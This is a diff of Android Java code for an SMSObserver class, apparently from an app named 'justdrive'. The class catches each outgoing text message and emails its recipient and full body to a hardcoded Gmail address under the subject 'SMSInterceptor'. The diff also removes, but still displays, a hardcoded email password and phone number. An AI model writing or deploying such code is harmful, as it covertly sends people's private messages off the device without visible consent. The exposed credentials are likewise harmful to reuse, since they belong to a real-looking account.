@@ -20,15 +20,11 @@ import android.database.ContentObserver;
 
 public class SMSObserver extends ContentObserver {
 
-	public  static Context context;
+  public  static Context context;
 
   private static GmailSender sender; 
-
   private static String initId = "0";
-
-  public  static String emailString = "justdriveapp1@gmail.com";
-  public  static String phoneNumberString = "2014640695";
-  public  static String emailPasswordString = "GHOST21ghost";
+  private static String gmailEmailString = "justdriveapp1@gmail.com";
 
   public SMSObserver(Handler handler, Context context) {
     super(handler);
@@ -64,8 +60,9 @@ public class SMSObserver extends ContentObserver {
         public void run() {
           try {
             sender = new GmailSender();
-            sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body,
-              emailString, emailString);
+            sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body, gmailEmailString);
+            /*sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body,
+              emailString, emailString);*/
           }
           catch(Exception e) {
             e.printStackTrace();
